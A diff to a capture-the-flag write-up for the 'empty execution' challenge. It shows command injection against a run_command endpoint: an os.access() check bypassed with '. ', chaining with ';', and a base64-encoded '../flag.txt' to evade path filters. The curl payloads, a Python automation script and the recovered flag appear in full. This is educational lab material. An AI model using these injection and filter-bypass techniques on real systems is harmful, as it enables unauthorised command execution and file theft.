@@ -38,6 +38,36 @@ to check if the binary or executable can be executed.If it cannot be executed,it
     
         return jsonify({'message': 'Not implemented'}), 501
 
-### Creating a Payload
+### Crafting a Payload
 
-- The first step is to bypass the os.access() filter by ensuring that it returns True,
+- The first step is to bypass the os.access() filter by ensuring that it returns True,I bypassed it with '. ' because the characters '.' and '..' are present in a linux directory.'.' is a link to your current directory and '..' is a link to the parent directory.I added space after '.' to allow the code split '.' and a couple of gibberish text to bypass the length check.
+   
+      $ curl -X POST https://braekerctf-empty-execution.chals.io/run_command -d '{"command": ". zzzzz"}' -H 'Content-Type: application/json'                                                    
+      {"message":"Command output: "}
+
+- Now we can execute commands,but I placed ";" after the space to execute close the first statement and execute nother statement.The next step was to find binaries to read the flag.I was able to use `which` to locate binaries and it worked.The `which` binary is used to find binaries path.Using which to find base64 and echo binaries' path confirmed the existence of the binaries on the server.
+
+      $ curl -X POST https://braekerctf-empty-execution.chals.io/run_command -d '{"command": ". ;which base64;which echo"}' -H 'Content-Type: application/json'
+      {"message":"Command output: /bin/base64\n/bin/echo\n"}
+
+- Now we can craft a payload with base64 and echo,I was able to craft this payload `base64 $(echo 'Li4vZmxhZy50eHQK' | base64 -d)`.I encoded '../flag.txt' with base64 since flag.txt is not present in the current directory, we will need to move up one directory and .. and / are both filtered by the code.Echo pipes it to base64 which decodes it and the process is executed with $().Base64 can read files passed to it and return it in base64 encoded text.The flag is encoded and returned back to us in base64 text.
+
+        curl -X POST https://braekerctf-empty-execution.chals.io/run_command -d '{"command": ". ;base64 $(echo 'Li4vZmxhZy50eHQK' | base64 -d)"}' -H 'Content-Type: application/json'
+      {"message":"Command output: YnJja3tDaDMzcl9VcF9CdWRkWV9KVTV0XzN4M0N1dDNfNF9EMXJlQ1Qwcnl9\n"} 
+
+- I automated it with python to receive the flag and decode it.
+
+      #! /usr/bin/env python3
+      import requests
+      import json
+      import base64
+      headers = {"Content-Type": "application/json"}
+      data = data = {'command':'. ;base64 $(echo \'Li4vZmxhZy50eHQK\' | base64 -d)'}
+      response = requests.post("https://braekerctf-empty-execution.chals.io/run_command",data=json.dumps(data),headers=headers).text
+      encodedFlag=json.loads(response)["message"].split('Command output: ')[1].encode()
+      print(base64.b64decode(encodedFlag).decode())
+
+- Flag
+
+      $ ./emptyexec.py
+        brck{Ch33r_Up_BuddY_JU5t_3x3Cut3_4_D1reCT0ry}
